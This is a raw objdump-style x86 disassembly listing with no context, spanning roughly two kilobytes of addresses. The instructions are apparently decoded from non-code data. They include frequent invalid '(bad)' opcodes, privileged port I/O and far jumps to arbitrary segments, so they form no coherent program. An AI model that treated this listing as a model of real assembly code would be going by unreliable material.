  4a1bdd:	imul   DWORD PTR ds:0x4f031cdf
  4a1be3:	and    al,0x40
  4a1be5:	dec    esi
  4a1be6:	cmp    edi,DWORD PTR [eax+eiz*8-0x79]
  4a1bea:	push   es
  4a1beb:	fidivr DWORD PTR [ebx]
  4a1bed:	xor    BYTE PTR ds:0x2a05d4b6,dl
  4a1bf3:	fidivr WORD PTR [ebx+0x28ec3269]
  4a1bf9:	jbe    0x4a1c50
  4a1bfb:	jg     0x4a1c1d
  4a1bfd:	in     al,dx
  4a1bfe:	push   ds
  4a1bff:	and    al,0xe5
  4a1c01:	out    dx,al
  4a1c02:	and    al,ah
  4a1c04:	es jle 0x4a1c41
  4a1c07:	or     eax,0xb1603405
  4a1c0c:	adc    esp,0x2f
  4a1c0f:	jb     0x4a1c25
  4a1c11:	lods   al,BYTE PTR ds:[esi]
  4a1c12:	or     DWORD PTR [ebp+eax*8+0x5f],edi
  4a1c16:	add    eax,0xe3bb2e0
  4a1c1b:	gs or  dl,bh
  4a1c1e:	sub    BYTE PTR [edi-0x4f],dh
  4a1c21:	mov    edi,0x602086e2
  4a1c26:	mov    esi,0x8b627d01
  4a1c2b:	adc    eax,0xb1cc0404
  4a1c30:	(bad)  
  4a1c32:	add    ecx,DWORD PTR [esi-0x69]
  4a1c35:	inc    ecx
  4a1c36:	scas   al,BYTE PTR es:[edi]
  4a1c37:	fucom  st(5)
  4a1c39:	push   edx
  4a1c3a:	fnstenv [esi]
  4a1c3c:	dec    ecx
  4a1c3d:	shl    DWORD PTR [esi-0x19],0x30
  4a1c41:	and    al,0x98
  4a1c43:	sbb    DWORD PTR [ecx+eiz*8-0x75d2de87],esi
  4a1c4a:	or     eax,ebp
  4a1c4c:	lods   eax,DWORD PTR ds:[esi]
  4a1c4d:	arpl   WORD PTR [ecx+0x61afa9a5],cx
  4a1c53:	cmp    BYTE PTR [ebp+0x12],dl
  4a1c56:	call   eax
  4a1c58:	bound  esp,QWORD PTR [ecx-0x2aad0e0]
  4a1c5e:	add    esi,esp
  4a1c60:	bound  ebp,QWORD PTR [esi+0x594bf83]
  4a1c66:	test   ebx,eax
  4a1c68:	push   es
  4a1c69:	pop    es
  4a1c6a:	jne    0x4a1c7d
  4a1c6c:	(bad)  
  4a1c6d:	fiadd  DWORD PTR [edi+0x4348f141]
  4a1c73:	(bad)  
  4a1c75:	aad    0x29
  4a1c77:	(bad)  
  4a1c78:	mov    edx,0x34512a46
  4a1c7d:	retf   
  4a1c7e:	es jecxz 0x4a1c18
  4a1c81:	pop    ds
  4a1c82:	mov    bl,0xd3
  4a1c84:	out    dx,al
  4a1c85:	imul   edi,DWORD PTR [ebx],0x171c0442
  4a1c8b:	stc    
  4a1c8c:	idiv   BYTE PTR [ebp+esi*2+0xa]
  4a1c90:	jae    0x4a1c94
  4a1c92:	mov    DWORD PTR [esi+0x7a285ab7],eax
  4a1c98:	push   edx
  4a1c99:	push   0x264f4d9a
  4a1c9e:	pop    es
  4a1c9f:	or     BYTE PTR [esi+ebp*1],ch
  4a1ca2:	push   ebp
  4a1ca3:	adc    al,0x80
  4a1ca5:	add    DWORD PTR [ebp+0x1f],ecx
  4a1ca8:	push   esp
  4a1ca9:	sub    ch,ah
  4a1cab:	shl    BYTE PTR [esi],0xe0
  4a1cae:	inc    ecx
  4a1caf:	inc    esp
  4a1cb0:	push   ds
  4a1cb1:	dec    edi
  4a1cb2:	inc    ebp
  4a1cb3:	sub    bl,dh
  4a1cb5:	mov    al,0x86
  4a1cb7:	inc    esp
  4a1cb8:	pop    ds
  4a1cb9:	shr    esi,cl
  4a1cbb:	add    BYTE PTR [esp+ecx*2+0x26],ah
  4a1cbf:	les    edx,FWORD PTR ds:[eax]
  4a1cc2:	lds    ebp,FWORD PTR [edi]
  4a1cc4:	cmp    BYTE PTR [ebp+0x48],cl
  4a1cc7:	loop   0x4a1d02
  4a1cc9:	dec    edx
  4a1cca:	add    al,0x74
  4a1ccc:	jle    0x4a1cdb
  4a1cce:	fld    DWORD PTR [edx-0x2e]
  4a1cd1:	cld    
  4a1cd2:	data16 (bad) 
  4a1cd4:	cmp    eax,DWORD PTR [edi-0x46]
  4a1cd7:	fcom   st(7)
  4a1cd9:	(bad)  
  4a1cda:	mov    al,0xa2
  4a1cdc:	or     ch,al
  4a1cde:	adc    eax,0x694ce709
  4a1ce3:	xlat   BYTE PTR ds:[ebx]
  4a1ce4:	jb     0x4a1c93
  4a1ce6:	push   edx
  4a1ce7:	retf   
  4a1ce8:	fadd   st,st(1)
  4a1cea:	xlat   BYTE PTR ds:[ebx]
  4a1ceb:	cmp    bh,BYTE PTR [ecx+0xc]
  4a1cee:	in     eax,dx
  4a1cef:	cmp    ecx,DWORD PTR [eax-0x36]
  4a1cf2:	sbb    bh,bh
  4a1cf4:	data16 stc 
  4a1cf6:	mov    dl,0xce
  4a1cf8:	call   0x6727:0x81ab35f8
  4a1cff:	push   cs
  4a1d00:	out    0x21,eax
  4a1d02:	jb     0x4a1ced
  4a1d04:	mov    cl,BYTE PTR gs:[esi-0x723dacd5]
  4a1d0b:	jmp    0x66b:0xb86fc38a
  4a1d12:	adc    al,0x7c
  4a1d14:	(bad)  
  4a1d16:	inc    edi
  4a1d17:	cmp    BYTE PTR [eax+0x5d78982b],dl
  4a1d1d:	xor    DWORD PTR [esi+0x6ed02b10],edi
  4a1d23:	jo     0x4a1d91
  4a1d25:	sbb    eax,DWORD PTR [esi]
  4a1d27:	jp     0x4a1cf3
  4a1d29:	push   edi
  4a1d2a:	sub    al,0xe0
  4a1d2c:	jnp    0x4a1cb7
  4a1d2e:	pop    esp
  4a1d2f:	inc    ebp
  4a1d30:	inc    esp
  4a1d31:	mov    al,BYTE PTR [ecx+edi*1]
  4a1d34:	dec    ebp
  4a1d35:	push   es
  4a1d36:	ret    
  4a1d37:	push   ds
  4a1d38:	mov    eax,0x59186548
  4a1d3d:	cmp    DWORD PTR [edi],ebx
  4a1d3f:	pop    esi
  4a1d40:	push   esp
  4a1d41:	sahf   
  4a1d42:	pop    ss
  4a1d43:	xor    bl,BYTE PTR [eax]
  4a1d45:	pop    edx
  4a1d46:	lahf   
  4a1d47:	cmp    DWORD PTR [edx-0x7b],esi
  4a1d4a:	or     DWORD PTR [ecx],ebx
  4a1d4c:	sub    eax,0x31dedfd
  4a1d51:	mov    DWORD PTR [ecx],edi
  4a1d53:	mov    ecx,DWORD PTR [ebx+0x10]
  4a1d56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a1d57:	sbb    DWORD PTR [eax],eax
  4a1d59:	push   esi
  4a1d5a:	mul    BYTE PTR [eax+0x4402c903]
  4a1d60:	and    BYTE PTR [eax],ah
  4a1d62:	stos   BYTE PTR es:[edi],al
  4a1d63:	cmc    
  4a1d64:	out    dx,eax
  4a1d65:	dec    ebx
  4a1d66:	pop    esp
  4a1d67:	loopne 0x4a1d11
  4a1d69:	shl    BYTE PTR [eax-0x7],0xa9
  4a1d6d:	pop    eax
  4a1d6e:	pushf  
  4a1d6f:	mov    DWORD PTR [ebp+0x20],edx
  4a1d72:	dec    ebx
  4a1d73:	stos   DWORD PTR es:[edi],eax
  4a1d74:	inc    ecx
  4a1d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a1d76:	mov    al,ds:0x214208e
  4a1d7b:	repnz aad 0x32
  4a1d7e:	dec    edx
  4a1d7f:	xchg   DWORD PTR [ebx],ebp
  4a1d81:	rol    BYTE PTR [eax-0x6],1
  4a1d84:	adc    BYTE PTR [eax],0x90
  4a1d87:	fistp  QWORD PTR [ebx+ebx*8-0x72aeaff0]
  4a1d8e:	push   ebx
  4a1d8f:	add    edx,DWORD PTR [edx-0x56]
  4a1d92:	push   edi
  4a1d93:	or     eax,0xca195626
  4a1d98:	je     0x4a1dc8
  4a1d9a:	loope  0x4a1db2
  4a1d9c:	rcr    DWORD PTR [ebp-0x168d0d44],1
  4a1da2:	adc    BYTE PTR [edi],ch
  4a1da4:	(bad)  
  4a1da5:	push   esi
  4a1da6:	or     DWORD PTR [edi-0x515e8be6],ecx
  4a1dac:	push   edi
  4a1dad:	jo     0x4a1da7
  4a1daf:	adc    BYTE PTR [eax],bl
  4a1db1:	mov    bl,0xc0
  4a1db3:	adc    ax,WORD PTR [ecx+ebx*1+0x5b]
  4a1db8:	push   ebp
  4a1db9:	dec    eax
  4a1dba:	inc    ebp
  4a1dbb:	push   0xffffffab
  4a1dbd:	outs   dx,BYTE PTR ds:[esi]
  4a1dbe:	test   DWORD PTR [edi+0x12],ebp
  4a1dc1:	lahf   
  4a1dc2:	imul   ecx,DWORD PTR [esi+0x61968383],0x705d8097
  4a1dcc:	sbb    BYTE PTR [ebp+0x49],cl
  4a1dcf:	(bad)  
  4a1dd0:	push   eax
  4a1dd1:	sub    cl,ch
  4a1dd3:	sbb    BYTE PTR [eax+eiz*1],dl
  4a1dd6:	cld    
  4a1dd7:	push   edi
  4a1dd8:	adc    DWORD PTR [eax-0x7229f900],esp
  4a1dde:	enter  0x2551,0x54
  4a1de2:	fiadd  DWORD PTR [ecx+0x51589139]
  4a1de8:	adc    al,0x86
  4a1dea:	sbb    al,0x21
  4a1dec:	cmp    DWORD PTR [eax+0x3d3c671b],edi
  4a1df2:	sbb    ecx,DWORD PTR [edx+eax*4]
  4a1df5:	sbb    bl,BYTE PTR [eax+0x4c]
  4a1df8:	addr16 nop
  4a1dfa:	xor    BYTE PTR [edi],ah
  4a1dfc:	dec    ebp
  4a1dfd:	sbb    eax,0x19370614
  4a1e02:	test   bl,ch
  4a1e04:	adc    al,0x3c
  4a1e06:	fs push ebx
  4a1e08:	loop   0x4a1e0e
  4a1e0a:	pop    es
  4a1e0b:	and    ebx,ecx
  4a1e0d:	inc    ebp
  4a1e0e:	lea    ebp,[eax+0x498c185a]
  4a1e14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a1e15:	stos   DWORD PTR es:[edi],eax
  4a1e16:	push   esp
  4a1e17:	mov    ds,eax
  4a1e19:	or     DWORD PTR [edi],0x30749f36
  4a1e1f:	fwait
  4a1e20:	jle    0x4a1e5b
  4a1e22:	es dec esi
  4a1e24:	dec    eax
  4a1e25:	and    eax,0x6ed84fd8
  4a1e2a:	jnp    0x4a1e88
  4a1e2c:	push   eax
  4a1e2d:	in     al,dx
  4a1e2e:	inc    esi
  4a1e2f:	or     ecx,DWORD PTR [ebx-0xa98183]
  4a1e35:	dec    esi
  4a1e36:	pop    ss
  4a1e37:	(bad)  
  4a1e38:	mov    ebp,0xc674c601
  4a1e3d:	jg     0x4a1e1b
  4a1e3f:	jmp    0x4a1e51
  4a1e41:	pop    edi
  4a1e42:	sub    esi,eax
  4a1e44:	cmp    esi,DWORD PTR [edi+0x68]
  4a1e47:	int3   
  4a1e48:	add    al,0x7f
  4a1e4a:	ins    BYTE PTR es:[edi],dx
  4a1e4b:	push   esi
  4a1e4c:	repz pop ecx
  4a1e4e:	ins    BYTE PTR es:[edi],dx
  4a1e4f:	ja     0x4a1ec9
  4a1e51:	jae    0x4a1e4d
  4a1e53:	or     BYTE PTR [ecx+0x789b1a65],bh
  4a1e59:	add    eax,0x688cb720
  4a1e5e:	cmp    BYTE PTR [eax+0x3e57b580],bh
  4a1e64:	nop
  4a1e65:	pop    es
  4a1e66:	into   
  4a1e67:	sbb    DWORD PTR [edi],0xf99445fe
  4a1e6d:	dec    ebp
  4a1e6e:	cwde   
  4a1e6f:	repz clc 
  4a1e71:	cmp    DWORD PTR ds:0xa79c550e,0x4de6a045
  4a1e7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a1e7c:	xor    al,0x87
  4a1e7e:	xor    al,0x1d
  4a1e80:	loopne 0x4a1e84
  4a1e82:	add    esi,DWORD PTR [esp+eax*1-0x2da25f8d]
  4a1e89:	add    eax,0xdba860b8
  4a1e8e:	inc    ebp
  4a1e8f:	dec    eax
  4a1e90:	pop    es
  4a1e91:	into   
  4a1e92:	sub    DWORD PTR [ebp+edx*8-0x4f3173ab],0xe7c1a5d
  4a1e9d:	cs push edi
  4a1e9f:	div    BYTE PTR [eax-0x7]
  4a1ea2:	push   es
  4a1ea3:	mov    DWORD PTR [eax],ebx
  4a1ea5:	or     DWORD PTR [ebx-0x178acfa0],ecx
  4a1eab:	lock (bad) 
  4a1ead:	icebp  
  4a1eae:	loop   0x4a1e90
  4a1eb0:	lahf   
  4a1eb1:	and    al,0x51
  4a1eb3:	adc    al,0xa3
  4a1eb5:	in     al,0xc9
  4a1eb7:	and    DWORD PTR [ebx-0x6b],0x709e70a7
  4a1ebe:	enter  0x9040,0x3
  4a1ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a1ec3:	fsubr  DWORD PTR [edx]
  4a1ec5:	fs jne 0x4a1e8c
  4a1ec8:	pop    ebp
  4a1ec9:	xor    dl,BYTE PTR [edx+edx*2+0x2e]
  4a1ecd:	pop    ebx
  4a1ece:	sahf   
  4a1ecf:	jecxz  0x4a1e62
  4a1ed1:	loopne 0x4a1f52
  4a1ed3:	fadd   DWORD PTR [ebp+0x4974778b]
  4a1ed9:	push   esi
  4a1eda:	or     BYTE PTR [esi+0x74],bh
  4a1edd:	or     DWORD PTR [ebx],edi
  4a1edf:	ss pop eax
  4a1ee1:	sbb    al,0x51
  4a1ee3:	aad    0x52
  4a1ee5:	inc    eax
  4a1ee6:	sbb    esp,DWORD PTR [ebx]
  4a1ee8:	jg     0x4a1efd
  4a1eea:	add    al,0x27
  4a1eec:	mov    esp,0xd800645
  4a1ef1:	sbb    al,cl
  4a1ef3:	mov    DWORD PTR [eax-0x6f],esp
  4a1ef6:	inc    ebx
  4a1ef7:	push   ebx
  4a1ef8:	lea    ecx,[eax+eax*1-0x137c09de]
  4a1eff:	outs   dx,DWORD PTR ds:[esi]
  4a1f00:	jecxz  0x4a1f24
  4a1f02:	adc    BYTE PTR [esi+0x75],dh
  4a1f05:	test   esp,ebp
  4a1f07:	jmp    0x4a1eb5
  4a1f09:	or     dl,BYTE PTR cs:0x8dff90fe
  4a1f10:	scas   al,BYTE PTR es:[edi]
  4a1f11:	sbb    eax,DWORD PTR [edx-0x66]
  4a1f14:	mov    eax,0xab6ba41
  4a1f19:	lea    esi,[ecx+eax*8]
  4a1f1c:	fndisi(8087 only) 
  4a1f1e:	(bad)  
  4a1f1f:	push   eax
  4a1f20:	(bad)  
  4a1f21:	enter  0xc1ce,0xd9
  4a1f25:	jg     0x4a1ec2
  4a1f27:	xor    al,0xf
  4a1f29:	xchg   esi,eax
  4a1f2a:	mov    dh,0xa
  4a1f2c:	(bad)  
  4a1f2d:	fbstp  TBYTE PTR [edi]
  4a1f2f:	mov    edx,ebx
  4a1f31:	enter  0x5dfa,0x5d
  4a1f35:	call   0x1c9fd1c4
  4a1f3a:	cmp    al,0x61
  4a1f3c:	jb     0x4a1f51
  4a1f3e:	mov    edx,0x8a5c6193
  4a1f43:	dec    ecx
  4a1f44:	add    dl,BYTE PTR [ecx]
  4a1f46:	or     ebp,edi
  4a1f48:	lea    esp,[eax]
  4a1f4a:	and    ecx,DWORD PTR [edx+edx*2-0x36]
  4a1f4e:	imul   ebx,esi,0x3c
  4a1f51:	pop    eax
  4a1f52:	fwait
  4a1f53:	dec    edx
  4a1f54:	sti    
  4a1f55:	xor    al,0x6e
  4a1f57:	(bad)  
  4a1f59:	pop    ecx
  4a1f5a:	push   cs
  4a1f5b:	pop    es
  4a1f5c:	pop    edx
  4a1f5d:	call   DWORD PTR [edi-0x6b]
  4a1f60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a1f61:	sar    BYTE PTR [ebx+ebx*2],cl
  4a1f64:	neg    DWORD PTR [ebp-0x11]
  4a1f67:	pop    edi
  4a1f68:	mov    dh,0x63
  4a1f6a:	push   edx
  4a1f6b:	pop    ss
  4a1f6c:	push   es
  4a1f6d:	(bad)  
  4a1f6e:	xlat   BYTE PTR ds:[ebx]
  4a1f6f:	into   
  4a1f70:	inc    edx
  4a1f71:	add    eax,eax
  4a1f73:	or     BYTE PTR [eax-0xafbb594],dh
  4a1f79:	add    BYTE PTR [edi+0xe],cl
  4a1f7c:	mov    al,0xce
  4a1f7e:	cli    
  4a1f7f:	or     ebx,ebp
  4a1f81:	sub    eax,eax
  4a1f83:	push   ds
  4a1f84:	inc    esp
  4a1f85:	mov    ch,bh
  4a1f87:	add    al,0x5a
  4a1f89:	mov    al,0x75
  4a1f8b:	test   BYTE PTR ds:0x4c1371fb,dl
  4a1f91:	cmp    BYTE PTR [ebx],0x40
  4a1f94:	(bad)  
  4a1f95:	adc    DWORD PTR [edx],edx
  4a1f97:	pop    eax
  4a1f98:	inc    eax
  4a1f99:	sahf   
  4a1f9a:	and    al,BYTE PTR [eax-0x27]
  4a1f9d:	loope  0x4a1f9f
  4a1f9f:	(bad)  
  4a1fa0:	pop    esp
  4a1fa1:	lahf   
  4a1fa2:	and    al,0xb1
  4a1fa5:	pop    ss
  4a1fa6:	repnz and dh,ch
  4a1fa9:	and    eax,0x640b1f57
  4a1fae:	dec    edi
  4a1faf:	inc    edi
  4a1fb0:	cmp    al,0x2a
  4a1fb2:	hlt    
  4a1fb3:	retf   0x9802
  4a1fb6:	out    0x32,al
  4a1fb8:	jg     0x4a2010
  4a1fba:	and    BYTE PTR [edx],al
  4a1fbc:	je     0x4a2038
  4a1fbe:	or     bl,BYTE PTR [ebx+0x6092eab6]
  4a1fc4:	je     0x4a2033
  4a1fc6:	sub    ch,BYTE PTR [esi+eax*2+0x54]
  4a1fca:	imul   edx
  4a1fcc:	cmp    BYTE PTR [eax],0x2c
  4a1fcf:	into   
  4a1fd0:	sub    al,0x88
  4a1fd2:	xchg   BYTE PTR [edi],dh
  4a1fd4:	sbb    al,0x12
  4a1fd6:	jg     0x4a1fff
  4a1fd8:	sbb    ah,ah
  4a1fda:	inc    esp
  4a1fdb:	lea    edx,[edi+0x1c]
  4a1fde:	push   edx
  4a1fdf:	call   0xd702:0xa56775a7
  4a1fe6:	fnsave [edi+0x58]
  4a1fe9:	sbb    DWORD PTR [esi],esp
  4a1feb:	in     al,dx
  4a1fec:	adc    al,0x78
  4a1fee:	inc    ebx
  4a1fef:	mov    edi,0x1a3e0368
  4a1ff4:	push   ebx
  4a1ff5:	mov    ebx,0x5829045
  4a1ffa:	arpl   WORD PTR [edi+0x1c],cx
  4a1ffd:	cmp    dl,al
  4a1fff:	fnstenv [esi]
  4a2001:	nop
  4a2002:	int3   
  4a2003:	push   edi
  4a2004:	sub    al,0xfc
  4a2006:	repz push ebx
  4a2008:	mov    al,0xad
  4a200a:	mov    ecx,0x8a0cd888
  4a200f:	inc    eax
  4a2010:	sub    eax,0x6d53e220
  4a2015:	push   ebx
  4a2016:	cmp    BYTE PTR [esi-0x7d],dh
  4a2019:	adc    DWORD PTR [ebp-0x7074a7ae],eax
  4a201f:	inc    eax
  4a2020:	nop
  4a2021:	int    0xe0
  4a2023:	pop    esp
  4a2024:	add    ebx,DWORD PTR ds:0x5255df2c
  4a202a:	push   es
  4a202b:	cdq    
  4a202c:	mov    dl,ah
  4a202e:	adc    DWORD PTR [ebp-0x74],ebx
  4a2031:	or     DWORD PTR [esi],ebx
  4a2033:	sbb    al,0x5f
  4a2035:	push   esi
  4a2036:	jae    0x4a2094
  4a2038:	dec    edi
  4a2039:	and    al,0x70
  4a203b:	mov    al,0xaf
  4a203d:	adc    eax,0xe88d0678
  4a2042:	sbb    ebp,DWORD PTR cs:[ebx-0x57]
  4a2046:	mov    ds:0xd1795217,al
  4a204b:	push   esp
  4a204c:	inc    eax
  4a204d:	sub    ecx,DWORD PTR [edx]
  4a204f:	cs inc esi
  4a2051:	ins    BYTE PTR es:[edi],dx
  4a2052:	in     eax,0xe0
  4a2054:	dec    edi
  4a2055:	inc    ebp
  4a2056:	mov    fs,WORD PTR [esi]
  4a2058:	mov    cl,BYTE PTR [esi]
  4a205a:	cmp    cl,BYTE PTR [edi+0x30]
  4a205d:	pop    edx
  4a205e:	xchg   ebx,eax
  4a205f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a2060:	mov    ecx,0x321c7f60
  4a2065:	mov    dl,BYTE PTR ss:[esi+0x57]
  4a2069:	dec    eax
  4a206a:	jo     0x4a20c7
  4a206c:	mov    ah,0xe
  4a206e:	dec    edi
  4a206f:	inc    eax
  4a2070:	sbb    al,0xb8
  4a2072:	call   0x16be9c87
  4a2077:	out    dx,al
  4a2078:	sub    eax,DWORD PTR [edx]
  4a207a:	(bad)  
  4a207c:	jbe    0x4a208f
  4a207e:	xchg   edi,eax
  4a207f:	inc    edi
  4a2080:	pop    esp
  4a2081:	and    bh,BYTE PTR [eax+0x1ebb60f2]
  4a2087:	pop    ecx
  4a2088:	push   esi
  4a2089:	push   ebx
  4a208a:	rcpps  xmm2,XMMWORD PTR [eax+0x74]
  4a208e:	or     ecx,DWORD PTR [esp+esi*1-0x7d768908]
  4a2095:	sub    BYTE PTR [esi-0x15],0xc6
  4a2099:	inc    edi
  4a209a:	pusha  
  4a209b:	and    BYTE PTR [eax+esi*8+0x61],al
  4a209f:	mov    al,ds:0x516c8e40
  4a20a4:	inc    edi
  4a20a5:	dec    ebp
  4a20a6:	push   ebx
  4a20a7:	nop
  4a20a8:	jecxz  0x4a207f
  4a20aa:	push   edx
  4a20ab:	dec    edi
  4a20ac:	ds push edi
  4a20ae:	repnz lds ebx,FWORD PTR [edx]
  4a20b1:	es lahf 
  4a20b3:	lahf   
  4a20b4:	push   edx
  4a20b5:	push   es
  4a20b6:	cmp    al,BYTE PTR [edi-0x46]
  4a20b9:	push   edx
  4a20ba:	jb     0x4a210a
  4a20bc:	imul   esp,DWORD PTR [ecx-0x59],0x222d4f6d
  4a20c3:	test   al,0x55
  4a20c5:	ds call 0xd37c:0x749120c0
  4a20cd:	inc    esi
  4a20ce:	jns    0x4a20e0
  4a20d0:	cmp    al,0x0
  4a20d2:	mov    ds:0xb155e94f,eax
  4a20d7:	or     BYTE PTR [eax+esi*1],ch
  4a20da:	pop    eax
  4a20db:	daa    
  4a20dc:	aad    0x9e
  4a20de:	rol    ch,1
  4a20e0:	sti    
  4a20e1:	ret    0xffaa
  4a20e4:	movups XMMWORD PTR [eax],xmm1
  4a20e7:	or     DWORD PTR [ebx+eax*8],0x6148ff50
  4a20ee:	or     edi,DWORD PTR [edx+eax*1+0x16473b43]
  4a20f5:	or     BYTE PTR [eax],cl
  4a20f7:	stos   DWORD PTR es:[edi],eax
  4a20f8:	and    eax,DWORD PTR [edx]
  4a20fa:	rol    DWORD PTR [edx-0x27af7f2d],cl
  4a2100:	add    ebx,DWORD PTR [edx+0xc]
  4a2103:	mov    WORD PTR es:[ecx+0x38],ss
  4a2107:	loop   0x4a213c
  4a2109:	bound  esp,QWORD PTR [esi+0x30c9a6f]
  4a210f:	mov    BYTE PTR [ebx+0x13],cl
  4a2112:	sub    BYTE PTR [esi],ch
  4a2114:	adc    BYTE PTR [edx],al
  4a2116:	jns    0x4a2131
  4a2118:	jns    0x4a211a
  4a211a:	icebp  
  4a211b:	jmp    0x4a2185
  4a211d:	sbb    dl,BYTE PTR [edx]
  4a211f:	ror    eax,1
  4a2121:	add    ecx,DWORD PTR [eax-0x14fcc721]
  4a2127:	dec    ebx
  4a2128:	add    al,0x1e
  4a212a:	mov    ah,0x9f
  4a212c:	fxch   st(1)
  4a212e:	shl    edx,1
  4a2130:	inc    ebp
  4a2131:	add    eax,DWORD PTR [ebx+ebp*8]
  4a2134:	sub    BYTE PTR [edx],bh
  4a2136:	add    ebp,ebx
  4a2138:	jae    0x4a21a7
  4a213a:	adc    BYTE PTR [ebx+0x4],0x5
  4a213e:	sbb    BYTE PTR [edx+0x33],ch
  4a2141:	or     bh,dl
  4a2143:	and    al,0x9c
  4a2145:	rol    DWORD PTR [edi+ebp*2+0x73196cfa],1
  4a214c:	dec    eax
  4a214d:	push   edi
  4a214e:	xor    al,0xf6
  4a2150:	add    al,0x11
  4a2152:	cwde   
  4a2153:	add    DWORD PTR [edx-0x4f],edx
  4a2156:	ss mov ecx,0x500ec9af
  4a215c:	cmp    BYTE PTR [esp+ecx*1-0x72b2dc8e],bh
  4a2163:	xchg   edx,eax
  4a2164:	push   esp
  4a2165:	mov    al,0x79
  4a2167:	lock adc al,ah
  4a216a:	xchg   esi,eax
  4a216b:	jno    0x4a2178
  4a216d:	push   es
  4a216e:	cmp    eax,0x4c2cb90a
  4a2173:	aad    0xa8
  4a2175:	push   edi
  4a2176:	sub    BYTE PTR [ebx+ecx*8+0x27],bh
  4a217a:	fisttp QWORD PTR [ebx]
  4a217c:	inc    esi
  4a217d:	jo     0x4a2117
  4a217f:	mov    ds:0xd69a43f0,al
  4a2184:	push   cs
  4a2185:	inc    esi
  4a2186:	add    ch,bl
  4a2188:	js     0x4a214b
  4a218a:	and    DWORD PTR [edi],ecx
  4a218c:	imul   edi,DWORD PTR [edx+0x4602461a],0x89a5b5e0
  4a2196:	inc    edx
  4a2197:	pop    edx
  4a2198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a2199:	cmp    eax,DWORD PTR es:[ecx+eiz*4+0x60]
  4a219e:	sub    eax,0xa30ee17
  4a21a3:	xlat   BYTE PTR ds:[ebx]
  4a21a4:	inc    edx
  4a21a5:	in     eax,dx
  4a21a6:	mov    cs,WORD PTR [ebx+0x17]
  4a21a9:	add    eax,0x26e0f2e6
  4a21ae:	(bad)  
  4a21af:	cmp    eax,0x301056ed
  4a21b4:	or     DWORD PTR [ebx+0x5ab84dcb],0x58bd75c6
  4a21be:	cmp    al,0x78
  4a21c0:	push   ss
  4a21c1:	sbb    al,0xe4
  4a21c3:	ja     0x4a21cb
  4a21c5:	retf   0x5699
  4a21c8:	add    BYTE PTR [esi+0x42],dl
  4a21cb:	or     ah,BYTE PTR [edx+0x30]
  4a21ce:	or     al,0xa
  4a21d0:	dec    eax
  4a21d1:	xchg   DWORD PTR [ebx+0x33d07288],eax
  4a21d7:	and    BYTE PTR [esi+0x44439513],al
  4a21dd:	push   ebx
  4a21de:	jmp    0x4a2220
  4a21e0:	add    al,0x9
  4a21e2:	lahf   
  4a21e3:	pop    edx
  4a21e4:	push   esp
  4a21e5:	push   0xd8100204
  4a21ea:	rol    al,0xf0
  4a21ed:	dec    edx
  4a21ee:	sub    cl,BYTE PTR ds:0x44e81d18
  4a21f4:	add    eax,0x848f18b4
  4a21f9:	nop
  4a21fa:	jp     0x4a21eb
  4a21fc:	(bad)
  4a2200:	test   edx,ecx
  4a2202:	rol    BYTE PTR [ecx],0x2a
  4a2205:	xor    esp,DWORD PTR [esi+ebp*4+0x4e]
  4a2209:	adc    ebp,ebp
  4a220b:	and    eax,0x6c7f4705
  4a2210:	cmp    DWORD PTR [edi+ebx*2],0xffffffd1
  4a2214:	test   DWORD PTR [ebp+0x772751fc],0xa3e8c800
  4a221e:	sbb    eax,0xe71675ef
  4a2223:	aad    0x69
  4a2225:	mov    esi,ecx
  4a2227:	add    al,0x38
  4a2229:	out    dx,eax
  4a222a:	push   ss
  4a222b:	rol    DWORD PTR [esi+ebx*2-0x741d053e],cl
  4a2232:	(bad)  
  4a2233:	stos   DWORD PTR es:[edi],eax
  4a2234:	add    esi,ecx
  4a2236:	jbe    0x4a21bc
  4a2238:	push   edx
  4a2239:	adc    al,0x42
  4a223b:	xchg   edi,eax
  4a223c:	push   es
  4a223d:	dec    ebx
  4a223e:	data16 lock cli 
  4a2241:	aaa    
  4a2242:	pop    esp
  4a2243:	push   eax
  4a2244:	out    dx,al
  4a2245:	rol    DWORD PTR [esi],cl
  4a2247:	cmp    dh,al
  4a2249:	jb     0x4a223b
  4a224b:	add    ebx,ecx
  4a224d:	int3   
  4a224e:	add    al,0xe
  4a2250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a2251:	out    dx,eax
  4a2252:	into   
  4a2253:	test   eax,0xa742d792
  4a2258:	or     DWORD PTR [eax],eax
  4a225a:	fs test esp,ebx
  4a225d:	repz test eax,0x1edf0b07
  4a2263:	test   eax,0x3b9cbb52
  4a2268:	out    dx,al
  4a2269:	xchg   ebp,eax
  4a226a:	pop    edi
  4a226b:	out    0x50,eax
  4a226d:	add    ebx,esp
  4a226f:	imul   edi,DWORD PTR [eax+0x14f45c18],0xe2d6fbf8
  4a2279:	ds (bad) 
  4a227c:	jecxz  0x4a22c4
  4a227e:	push   es
  4a227f:	jb     0x4a2251
  4a2281:	and    ch,BYTE PTR [esi]
  4a2283:	push   cs
  4a2284:	inc    ecx
  4a2285:	pop    ebx
  4a2286:	popa   
  4a2287:	lea    edi,[esi]
  4a2289:	adc    eax,0x2647c10f
  4a228e:	xchg   DWORD PTR [ebx+esi*2],edi
  4a2291:	call   0xb107:0x2b75084b
  4a2298:	mov    ebp,0x530d2215
  4a229d:	daa    
  4a229e:	jns    0x4a227c
  4a22a0:	xor    eax,0xd06f1112
  4a22a5:	ss jecxz 0x4a2277
  4a22a8:	(bad)  
  4a22aa:	(bad)  
  4a22ab:	es push 0x2a
  4a22ae:	ret    0x6380
  4a22b1:	jne    0x4a2243
  4a22b3:	(bad)  
  4a22b4:	xchg   ecx,eax
  4a22b5:	xchg   edx,eax
  4a22b6:	add    esi,DWORD PTR [edx+0x34]
  4a22b9:	push   edx
  4a22ba:	add    DWORD PTR [edi+0x28a5e0a9],ecx
  4a22c0:	add    al,0x45
  4a22c2:	add    eax,0xd2b1e26b
  4a22c7:	cmp    dh,0x3b
  4a22ca:	sti    
  4a22cb:	xchg   BYTE PTR [edx-0x7a],dh
  4a22ce:	pop    ebp
  4a22cf:	das    
  4a22d0:	push   0x534e4c68
  4a22d5:	aaa    
